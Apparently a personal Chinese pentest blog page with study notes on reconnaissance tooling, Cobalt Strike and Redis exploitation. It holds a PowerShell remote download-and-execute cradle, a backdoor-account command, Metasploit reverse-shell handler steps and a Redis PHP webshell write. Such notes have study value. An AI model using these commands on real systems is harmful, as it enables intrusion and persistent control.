<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>c1y2m3’blog</title>
    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
</head>
<body>
<header class="header">
    <div class="header-inner">
        <div class="header-title">

        </div>
        <nav class="header-nav">
            
            <a href="/c1y2m3.github.io/" class="header-nav-link">
                首页
            </a>
            

            
            <a href="/c1y2m3.github.io/archives" class="header-nav-link">
                归档
            </a>
            

            
            <a href="/c1y2m3.github.io/tags" class="header-nav-link">
                标签
            </a>
            

            
        </nav>
    </div>
</header>
<header class="mobile-header">
    <div class="mobile-nav">
        <div class="mobile-nav-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="mobile-nav-title">
            <a href="/c1y2m3.github.io/" class="mobile-nav-title-link">John Doe's Blog</a>
        </div>

    </div>
    <nav class="mobile-menu">
        <ul class="mobile-menu-list">
            <li class="mobile-menu-item">
                <i class="iconfont icon-home"></i>
                <a href="/c1y2m3.github.io/" class="mobile-nav-link">首页</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-archive"></i>
                <a href="/c1y2m3.github.io/archives" class="mobile-nav-link">归档</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-tag"></i>
                <a href="/c1y2m3.github.io/tags" class="mobile-nav-link">标签</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-about"></i>
                <a href="/c1y2m3.github.io/about/" class="mobile-nav-link">关于</a>
            </li>
        </ul>
    </nav>
</header>
<div class="main">
    <div class="content-inner">
        <div class="posts">
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/10/07/关于前期信息收集笔记/">关于前期信息收集笔记</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-10-07</span>
                
            </div>
            <div class="post-content">
                
                    <p>1.通过HTTPS证书日志收集信息:<a href="http://censys.io" target="_blank" rel="noopener">http://censys.io</a></p>
<h2 id="资产搜索"><a href="#资产搜索" class="headerlink" title=" 资产搜索:"></a> 资产搜索:</h2><p><a href="http://www.zoomeye.org" target="_blank" rel="noopener">www.zoomeye.org</a> #python<br><a href="http://www.shodan.io" target="_blank" rel="noopener">www.shodan.io</a><br><a href="http://www.fofa.so" target="_blank" rel="noopener">www.fofa.so</a></p>
<h2 id="2-CDN解析记录"><a href="#2-CDN解析记录" class="headerlink" title=" 2.CDN解析记录:"></a> 2.CDN解析记录:</h2><p><code>查看历史解析记录，中奖率蛮高的：</code><br><a href="https://viewdns.info" target="_blank" rel="noopener">https://viewdns.info</a> </p>
<p><code>子域名的DNS解析记录：</code></p>
<p><a href="http://site.ip138.com" target="_blank" rel="noopener">http://site.ip138.com</a></p>
<p><code>多地 ping ，感觉现在没用了</code><br><a href="http://ping.chinaz.com" target="_blank" rel="noopener">http://ping.chinaz.com</a></p>
<p>查看远程图片的方法，服务器的来源，还有就是Email，不过一般都是分开的，最坏的方法就是DDOS攻击，当流量耗尽IP就出来了。</p>
<p>还有一种方法就是Znmap对全网进行扫描，筛选banner。参考：</p>
<p><a href="https://lcx.cc/post/4479/" target="_blank" rel="noopener">https://lcx.cc/post/4479/</a></p>
<h2 id="3-搜索引擎"><a href="#3-搜索引擎" class="headerlink" title=" 3.搜索引擎:"></a> 3.搜索引擎:</h2><p><a href="http://www.ask.com" target="_blank" rel="noopener">http://www.ask.com</a><br><a href="http://cn.bing.com" target="_blank" rel="noopener">http://cn.bing.com</a><br><a href="http://so.com" target="_blank" rel="noopener">http://so.com</a><br><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a><br>……</p>
<h2 id="子域名"><a href="#子域名" class="headerlink" title=" 子域名:"></a> 子域名:</h2><p><strong>在线: <a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a></strong></p>
<p> ==&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&apos;url.txt&apos;, &apos;r&apos;) as f, open(&apos;new.txt&apos;, &apos;w&apos;) as f1:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        lines=line.split(&apos;-&apos;)</span><br><span class="line">        result = lines[-1]</span><br><span class="line">        #re =result.strip(&apos;\n&apos;)</span><br><span class="line">        f1.write(result)</span><br></pre></td></tr></table></figure></p>
<h2 id="使用nmap批量扫描"><a href="#使用nmap批量扫描" class="headerlink" title="使用nmap批量扫描:"></a>使用nmap批量扫描:</h2><p>nmap -T4  -A -v -oA r1 -iL 000.txt</p>
<p>xsltproc -o r2.htm r1.xml</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举:"></a>枚举:</h2><p>SubDomainsBrute.py</p>
<p>Layer子域名挖掘机</p>
<h2 id="验证Url网页状态码-刷Src必备-："><a href="#验证Url网页状态码-刷Src必备-：" class="headerlink" title="验证Url网页状态码(刷Src必备) ："></a>验证Url网页状态码(刷Src必备) ：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Created on Fri Sep 28 11:12:44 2018</span><br><span class="line"></span><br><span class="line">@author: admin</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">from concurrent import futures</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, format=&quot;%(message)s&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Src:</span><br><span class="line">    def __init__(self, max_threads=50, max_timeout=3, url_file=&apos;url.txt&apos;):</span><br><span class="line">        self.max_threads = max_threads  # 最大并发线程数</span><br><span class="line">        self.max_timeout = max_timeout  # 最大请求超时时间</span><br><span class="line">        self.url_file = url_file        # 同级目录下存放爆破出来的域名的文件名</span><br><span class="line"></span><br><span class="line">        self.executor = futures.ThreadPoolExecutor(max_workers=max_threads)</span><br><span class="line"></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&quot;,</span><br><span class="line">            &apos;Referer&apos;: &apos;http://www.58.com/&apos;,</span><br><span class="line">            &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9,en;q=0.8&apos;,</span><br><span class="line">            # &apos;Cookie&apos;: &apos;这里写你的Cookie&apos;,</span><br><span class="line">            &apos;Connection&apos;: &apos;close&apos;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    def auth(self, url):</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url, headers=self.headers,</span><br><span class="line">                             timeout=self.max_timeout)</span><br><span class="line">            content = r.content</span><br><span class="line">            if content:</span><br><span class="line">                header_list = []  # [&apos;nginx/1.10.3&apos;, &apos;PHP/5.6.20&apos;]</span><br><span class="line">                header_server = r.headers.get(&apos;Server&apos;)</span><br><span class="line">                header_XPoweredBy = r.headers.get(&apos;X-Powered-By&apos;)</span><br><span class="line"></span><br><span class="line">                if header_XPoweredBy is not None:</span><br><span class="line">                    header_list.append(header_XPoweredBy)</span><br><span class="line">                if header_server is not None:</span><br><span class="line">                    header_list.append(header_server)</span><br><span class="line"></span><br><span class="line">                if not r.history:</span><br><span class="line">                    logging.info(</span><br><span class="line">                        &quot;[ ] &#123;&#125; =&gt; &#123;&#125; =&gt; &#123;&#125;&quot;.format(url, r.status_code, header_list))</span><br><span class="line">                else:</span><br><span class="line">                    status_lst = []</span><br><span class="line">                    for code in r.history:</span><br><span class="line">                        status_lst.append(code.status_code)</span><br><span class="line">                        status_lst.append(r.status_code)</span><br><span class="line">                    logging.info(</span><br><span class="line">                        &quot;[+] &#123;&#125; =&gt; &#123;&#125; =&gt; &#123;&#125;&quot;.format(url, status_lst, header_list))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def dispatcher(self):</span><br><span class="line">        try:</span><br><span class="line">            with open(self.url_file) as f:</span><br><span class="line">                while True:</span><br><span class="line">                    line = f.readline()</span><br><span class="line">                    if line:</span><br><span class="line">                        url = &quot;http://&quot; + line.strip()  # 去掉每行末尾的\r\n</span><br><span class="line">                        self.executor.submit(self.auth, url)</span><br><span class="line">                    else:</span><br><span class="line">                        break</span><br><span class="line">        except Exception:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    src58 = Src(max_threads=100, max_timeout=3, url_file=&apos;url.txt&apos;)</span><br><span class="line">    src58.dispatcher()</span><br></pre></td></tr></table></figure>
<h2 id="文件泄露"><a href="#文件泄露" class="headerlink" title=" 文件泄露:"></a> 文件泄露:</h2><p> 检查Flash跨域策略文件crossdomain.xml</p>
<p><img src="https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/cross.png" alt="
"></p>
<ul>
<li>域传送漏洞，查询ns记录：</li>
</ul>
<hr>
<p> <a href="https://github.com/LeoHuang2015/xfr_scanner" target="_blank" rel="noopener">https://github.com/LeoHuang2015/xfr_scanner</a></p>
<p>DNS服务器使用的TCP/UDP端口号是53：</p>
<p><code>nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=https://www.test.com -p 53 -Pn 192.168.1.2</code></p>
<h2 id="从主站爬取url："><a href="#从主站爬取url：" class="headerlink" title="从主站爬取url："></a>从主站爬取url：</h2><p>burp spider | domain hunter | WebReboot</p>
<h2 id="whois查询和关联查询"><a href="#whois查询和关联查询" class="headerlink" title=" whois查询和关联查询: "></a> whois查询和关联查询: </h2><p><a href="http://whois.chinaz.com；" target="_blank" rel="noopener">http://whois.chinaz.com；</a> 邮箱反查域名|联系人信息<br><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a>    IP反查域名</p>
<h2 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title=" Google hacking"></a> Google hacking</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中</span><br><span class="line">site:　　site:baidu.com将返回所有和这个站有关的URL</span><br><span class="line">intext:　　将返回所有在网页正文部分包含关键词的网页</span><br><span class="line">intitle:　　将返回所有网页标题中包含关键词的网页</span><br><span class="line">cache:　　搜索google里关于某些内容的缓存</span><br><span class="line">define:　　搜索某个词语的定义</span><br><span class="line">filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等</span><br><span class="line">info:　　查找指定站点的一些基本信息</span><br><span class="line">inurl:　　搜索我们指定的字符是否存在于URL中</span><br><span class="line">Link:　　link:baidu.com可以返回所有和baidu.com做了链接的URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+　　把google可能忽略的字列如查询范围。</span><br><span class="line">-　　把某个字忽略，例子：新加 -坡。</span><br><span class="line">~　　同意词。</span><br><span class="line">.　　单一的通配符。</span><br><span class="line">*　　通配符，可代表多个字母。</span><br><span class="line">&quot;&quot;　　精确查询。</span><br></pre></td></tr></table></figure>
<h2 id="旁站C段："><a href="#旁站C段：" class="headerlink" title=" 旁站C段："></a> 旁站C段：</h2><p><code>http://www.webscan.cc</code></p>
<h2 id="网站指纹"><a href="#网站指纹" class="headerlink" title=" 网站指纹:"></a> 网站指纹:</h2><p><code>chrome 插件:wappalyzer</code><br><code>云悉:http://www.yunsee.cn</code></p>
<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title=" 目录爆破:"></a> 目录爆破:</h2><p><code>御剑</code></p>
<h2 id="Nmap开发端口"><a href="#Nmap开发端口" class="headerlink" title=" Nmap开发端口:"></a> Nmap开发端口:</h2><p>nmap -v -A -p1-65535 badiu.com -oX target_all.xml</p>
<p>nmap -T4  -A -v  112.29.252.253</p>
<p>待续。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title=" 总结"></a> 总结</h2><h5 id="信息收集决定测试漏洞数量-需要耐心加细心"><a href="#信息收集决定测试漏洞数量-需要耐心加细心" class="headerlink" title="信息收集决定测试漏洞数量,需要耐心加细心"></a>信息收集决定测试漏洞数量,需要耐心加细心</h5><p>=&gt;<br>=&gt;<br>=&gt;</p>
<h2 id="渗透标准"><a href="#渗透标准" class="headerlink" title=" 渗透标准"></a> <a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="noopener">渗透标准</a></h2><p>附钟馗之眼的API资产收集脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">author : xnianq</span><br><span class="line">date : 2016-08-25</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">access_token=&apos;&apos;</span><br><span class="line">ip_list=[]</span><br><span class="line">def login():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">     输入帐号密码，进行登录操作</span><br><span class="line">    :return:  访问口令 access_token</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    user = raw_input(&apos;[-] input : username :&apos;)</span><br><span class="line">    passwd = raw_input(&apos;[-] input : passwd :&apos;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;username&apos; : user,</span><br><span class="line">        &apos;password&apos; : passwd</span><br><span class="line">    &#125;</span><br><span class="line">    data_encoded = json.dumps(data)</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url=&quot;https://api.zoomeye.org/user/login&quot;,data=data_encoded)</span><br><span class="line">        r_decode = json.loads(r.text)</span><br><span class="line">        global access_token</span><br><span class="line">        access_token = r_decode[&apos;access_token&apos;]</span><br><span class="line">    except Exception,e:</span><br><span class="line">        print &apos;[-] info : username or password seems wrong,please try again .&apos;</span><br><span class="line">        exit()</span><br><span class="line">def saveStrToFile(file,str):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    将字符串写入文本中</span><br><span class="line">    :param file:</span><br><span class="line">    :param str:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with open(file,&apos;w&apos;) as output:</span><br><span class="line">        output.write(str)</span><br><span class="line">def saveListToFile(file,list):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    将列表逐行写入文件中</span><br><span class="line">    :param file:</span><br><span class="line">    :param list:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    s = &apos;\n&apos;.join(list)</span><br><span class="line">    with open(file,&apos;w&apos;) as output:</span><br><span class="line">        output.write(s)</span><br><span class="line">def apiTest():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    进行Api测试</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    page = 1</span><br><span class="line">    global access_token</span><br><span class="line">    with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input:</span><br><span class="line">        access_token = input.read()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &apos;Authorization&apos; : &apos;JWT &apos; + access_token,</span><br><span class="line">    &#125;</span><br><span class="line">    while(True):</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url = &apos;https://api.zoomeye.org/host/search?query=“ximalaya.com”&amp;page=&apos;+str(page),headers=headers)</span><br><span class="line">            r_decoded = json.loads(r.text)</span><br><span class="line">            for x in r_decoded[&apos;matches&apos;]:</span><br><span class="line">                print x[&apos;ip&apos;]</span><br><span class="line">                ip_list.append(x[&apos;ip&apos;])</span><br><span class="line">            print &apos;[-] info : count &apos; + str(page*10)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            if str(e.message) == &apos;matches&apos;:</span><br><span class="line">                print &apos;[-] info : account was break ,excceeding the max limitations&apos;</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                print &apos;[-] info :&apos; + str(e.message)</span><br><span class="line">        else:</span><br><span class="line">            if page == 100 :</span><br><span class="line">                break</span><br><span class="line">            page +=1</span><br><span class="line">def main():</span><br><span class="line">    if not os.path.isfile(&apos;access_token.txt&apos;):</span><br><span class="line">        print &apos;[-] info : access_toke is not exists,please login&apos;</span><br><span class="line">        login()</span><br><span class="line">        saveStrToFile(&apos;access_token.txt&apos;,access_token)</span><br><span class="line">    apiTest()</span><br><span class="line">    saveListToFile(&apos;ip_list.txt&apos;,ip_list)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/09/29/ Cobalt Strike学习笔记/">Cobalt Strike学习笔记</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-09-29</span>
                
            </div>
            <div class="post-content">
                
                    <p>　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。
　</p>
<h5 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h5><p>Java环境，服务端运行在Linux系统上。</p>
<p><code>sudo ./teamserver 172.28.100.188 root</code></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b" alt=""></p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca" alt=""></p>
<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<h5 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h5><ol>
<li><code>View =&gt; Credentials</code><br>通过hashdump或者Mimikatz抓取过的密码都会储存在这里。<br><code>Web log =&gt; #显示web访问记录</code></li>
<li>Packages  #攻击包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   生成恶意的HTA木马文件</span><br><span class="line">MS Office Macro   生成office宏病毒文件</span><br><span class="line">Payload Generator   生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay   生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper   捆绑器，能够对文档类进行捆绑</span><br><span class="line">Windows Executable   生成可执行exe木马</span><br><span class="line">Windows Executable(S)  生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<h5 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h5><p>首先创建一个Listener，点击cobalt strike -&gt;Listeners -&gt; Add</p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baefa1550f8dd17df72d58e" alt=""></p>
<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://172.28.100.188:81/a&#39;))&quot;</code></p>
<h5 id="word宏-CHM制作-LNK-水坑攻击-待续！"><a href="#word宏-CHM制作-LNK-水坑攻击-待续！" class="headerlink" title="word宏 CHM制作 LNK 水坑攻击 待续！"></a>word宏 CHM制作 LNK 水坑攻击 待续！</h5><ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<h5 id="右键-进入-Interact-进入交互模式"><a href="#右键-进入-Interact-进入交互模式" class="headerlink" title="右键 进入 Interact 进入交互模式"></a>右键 进入 Interact 进入交互模式</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf105ddb5aa66c49adbcba" alt=""></p>
<p><code>详情输入 Help</code> shell net user test test /add</p>
<ul>
<li><ul>
<li><h3 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h3>权限维持：<br>当cs获取到一个上线机器，把这个机器丢给msf中meterpreter获取session</li>
</ul>
</li>
</ul>
<p><code>msf &gt; use exploit/multi/handler</code></p>
<p><code>msf exploit(handler) &gt; set payload</code></p>
<p><code>windows/meterpreter/reverse_tcp</code></p>
<p><code>payload =&gt; windows/meterpreter/reverse_tcp</code></p>
<p><code>msf exploit(handler) &gt; set lhost 192.168.3.72</code></p>
<p><code>lhost =&gt; 192.168.3.72</code></p>
<p><code>msf exploit(handler) &gt; set lport 5555</code></p>
<p><code>lport =&gt; 5555</code></p>
<p><code>msf exploit(handler) &gt; exploit -j</code></p>
<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<p>之后Cobalt strike 创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf监听的端口。</p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baeff52db5aa66c49ac9f40" alt=""></p>
<p>然后选中计算机，右键-&gt;Spawn:选择刚刚创建的监听器：<br>可以看到目标主机的已上线，我们可以进行我们的操作了。</p>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf020bea3b4a262af8e6cf" alt=""></p>
<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<h5 id="0x05-与cs进行联动"><a href="#0x05-与cs进行联动" class="headerlink" title="0x05 与cs进行联动"></a>0x05 与cs进行联动</h5><p>msf获得了一个meterpreter的session，想把session传给cs<br>在cs创建一个监听，host修改成cs客户端IP，监听6666端口。</p>
<p>此时切我们换到meterpreter中，</p>
<p><code>meterpreter &gt; background # 切换到后台</code></p>
<p><code>msf exploit(handler) &gt; use</code></p>
<p><code>exploit/windows/local/payload_inject</code></p>
<p><code>这个exploit是注入一个新的payload 到当前的session里面</code></p>
<p><code>msf exploit(payload_inject) &gt; set payload</code></p>
<p><code>windows/meterpreter/reverse_http # 不能使用x64的payload</code></p>
<p><code>msf exploit(payload_inject) &gt; set DisablePayloadHandler true</code><br><code>关闭msf payload的监听，可以不用设置，不影响效果</code></p>
<p><code>msf exploit(payload_inject) &gt; set lhost 192.168.3.103</code></p>
<p><code>msf exploit(payload_inject) &gt; set lport 6666 # 监听者的监听端口</code></p>
<p><code>msf exploit(payload_inject) &gt; set session 1</code></p>
<p><code>msf exploit(payload_inject) &gt; exploit</code></p>
<p>根据上线的肉鸡，可以使用SOCKS代理</p>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/09/26/ redis安全详解/">Redis学习详解</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-09-26</span>
                
            </div>
            <div class="post-content">
                
                    <ol>
<li><p>环境:Ubantu  redis_version:4.0.11</p>
<ol start="2">
<li>默认端口 :6379<br>安装过程:</li>
</ol>
<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15" alt=""></p>
</li>
</ol>
<h6 id="REmote-DIctionary-Server-Redis-是一个key-value数据库"><a href="#REmote-DIctionary-Server-Redis-是一个key-value数据库" class="headerlink" title="REmote DIctionary Server(Redis)是一个key-value数据库"></a>REmote DIctionary Server(Redis)是一个key-value数据库</h6><p><code>info</code> Redis版本和服务器上内核版本信息，以及配置文件绝对路径。</p>
<p><code>keys *</code> 参考Key值 <code>get key</code>   对应的值<br><code>flushall</code> 删除所有数据  <code>del key</code>删除键为key的数据</p>
<h5 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set 1 &quot;test&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h5 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="写入ssh公钥，获取操作系统权限"></a>写入ssh公钥，获取操作系统权限</h5><p>将本机的公钥作为value，key值随意，然后通过修改数据库默认路径和缓冲文件，把缓冲文件写在文件里，等于在服务端/root/.ssh下生成授权的key.</p>
<p>客户端生成Key: ssh-keygen -t rsa</p>
